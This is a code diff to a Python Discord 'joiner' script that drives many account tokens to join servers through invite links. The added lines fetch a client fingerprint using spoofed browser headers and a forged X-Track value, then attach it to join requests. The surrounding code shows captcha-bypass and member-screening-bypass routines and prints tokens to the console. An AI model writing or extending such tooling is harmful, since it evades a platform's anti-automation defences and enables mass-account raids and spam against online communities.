@@ -2,6 +2,7 @@ import colorama
 import time
 import threading
 import traceback
+import requests
 import random
 import base64
 import json
@@ -56,6 +57,23 @@ def joiner_thread(token, serverid, invitelink, memberscreen, module_status, answ
         "client_event_source": None
     }
     session = header.get_session.get_session()
+    headers_finger = {
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive',
+        'Referer': 'https://discord.com/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-GPC': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36 Edg/114.0.1823.51',
+        'X-Track': 'eyJvcyI6IklPUyIsImJyb3dzZXIiOiJTYWZlIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKElQaG9uZTsgQ1BVIEludGVybmFsIFByb2R1Y3RzIFN0b3JlLCBhcHBsaWNhdGlvbi8yMDUuMS4xNSAoS0hUTUwpIFZlcnNpb24vMTUuMCBNb2JpbGUvMTVFMjQ4IFNhZmFyaS82MDQuMSIsImJyb3dzZXJfdmVyc2lvbiI6IjE1LjAiLCJvc192IjoiIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfZG9tYWluX2Nvb2tpZSI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOiJzdGFibGUiLCJjbGllbnRfZXZlbnRfc291cmNlIjoic3RhYmxlIn0',
+    }
+    response = requests.get('https://discord.com/api/v9/experiments', headers=headers_finger)
+    if response.status_code == 200:
+        data = response.json()
+        fingerprint = data["fingerprint"]
+        print(f"[{Fore.LIGHTGREEN_EX}Info{Fore.RESET}] [joiner.py:88] {Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX}Got Fingerprint {Fore.RESET} | {Fore.GREEN}{fingerprint}{Fore.RESET}")
     headers = {
         "Authorization": token,
         "Cookie": cookie_string,
@@ -76,6 +94,7 @@ def joiner_thread(token, serverid, invitelink, memberscreen, module_status, answ
         "Sec-Fetch-Mode": "cors",
         "Sec-Fetch-Site": "same-origin",
         "User-Agent": header.random_agent.random_agent(),
+        "x-fingerprint": fingerprint,
         "X-Debug-Options": "bugReporterEnabled",
         "X-Discord-Locale": "en-US",
         "X-Discord-Timezone": "America/New_York",
@@ -84,7 +103,7 @@ def joiner_thread(token, serverid, invitelink, memberscreen, module_status, answ
     try:
         joinreq = session.post(f"https://discord.com/api/v9/invites/{invitelink}", headers=headers, json={})
         if joinreq.status_code == 400:
-            
+
             if bypasscaptcha == True:
                 print("[-] Captcha Bypassing.. "+ extract_token)
                 if answers == "1":
@@ -118,7 +137,7 @@ def joiner_thread(token, serverid, invitelink, memberscreen, module_status, answ
                                 return
                             else:
                                 print("[-] Failed Memberbypass: " + extract_token)
-            
+
             else:
                 if "captcha_key" in joinreq.json():
                     print("[-] Failed join: (Captcha Wrong) " + extract_token)
